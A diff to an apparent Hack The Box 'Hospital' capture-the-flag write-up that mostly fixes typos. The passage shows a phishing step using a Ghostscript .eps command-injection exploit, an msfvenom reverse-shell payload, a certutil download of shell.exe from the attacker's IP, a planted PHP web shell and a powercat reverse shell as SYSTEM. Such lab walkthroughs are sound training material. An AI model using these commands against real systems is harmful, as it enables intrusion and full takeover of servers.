@@ -406,11 +406,11 @@ Having this credential we log into the web mail server on https://hospital.htb a
 ![hospital6](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9ddaabae-2eff-4ff5-9cab-c8af1fc32ca4)
 
 Knowing this, we prepare a phising attack for which we need to look for ghostscript vulnerabilities. Investigation leads to this exploit https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection, which allows injection of commands in `.eps` files.<br>
-Next step is then to generate a `msfevenom`` payload for windows.
+Next step is then to generate a `msfevenom` payload for windows.
 ```markdown
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=1919 -f exe -a x64 --platform windows -o shell.exe
 ```
-Now, to succeed in the phising attack, what seems to work is to divide the process in 2 steps.<brZ
+Now, to succeed in the phising attack, what seems to work is to divide the process in 2 steps.<br>
 First, inject a payload  in a `project.eps` file which will download the `shell.exe`.
 ```markwdown
 > python3 ./exploit.py -g -p 'certutil -urlcache -split -f "http://10.10.xxx.xxx/shell.exe" shell.exe' -x eps
@@ -424,7 +424,7 @@ Start a python HTTP server and reply the email attaching the `project.eps` file.
 ![hospital7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/caeb638c-f37c-4f1d-bd6f-8e637d9976e5)
 
 Shortly after, a request on the python server is registered to download the `shell.exe` file.<br>
-Next step is to execute the shell in the server. For this we will repeat the procedure but the command to be injected in hte `.eps` file will just execute the shell previously downloaded by the host.<br>
+Next step is to execute the shell in the server. For this we will repeat the procedure but the command to be injected in the `.eps` file will just execute the shell previously downloaded by the host.<br>
 ```markwdown
 > python3 ./exploit.py -g -p 'shell.exe' -x eps
 ```
@@ -449,7 +449,7 @@ And finally we are able to get the `user.txt` flag.
 ### PHASE 3. System
 Enumerate the system info.
 ```markdwon
->systeminfo
+> systeminfo
 
 Host Name:                 DC
 OS Name:                   Microsoft Windows Server 2019 Standard
@@ -466,16 +466,11 @@ System Manufacturer:       VMware, Inc.
 System Model:              VMware7,1
 System Type:               x64-based PC
 ```
-To obtain a system reverse shell, we have to notice that the webserver service running on port 443 (webmail) is running as sytem and also we have write permissions on the webroot folder located in `c:\xampp\htdocs`.<br>
-Since we have an RDP gui, we can just copy another php p0wny php shell in this location, and call it with firefox.<br>
-Then, send a reverse shell in Windows with `powercat`
+To obtain a system reverse shell, we have to notice that the webserver service running on port 443 (webmail) is running as sytem and also we have write permissions on the webroot folder located in `c:\xampp\htdocs`<br>
+Since we have an RDP gui, we can just copy another php p0wny php shell in this location, and call it with firefox. Then, send a reverse shell in Windows with `powercat`
 
 ![hospital9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/a2375ce6-2d11-4c9f-8f69-97c26e5d537e)
 
 And a system reverse shelll is received our listener.
 
-![hospital10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8ca4f994-f7b9-4b95-bbe2-2fc1228bbaec)
-
-
-
-
+![hospital13](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/2647cde2-5467-45ed-a9eb-ffa526517524)
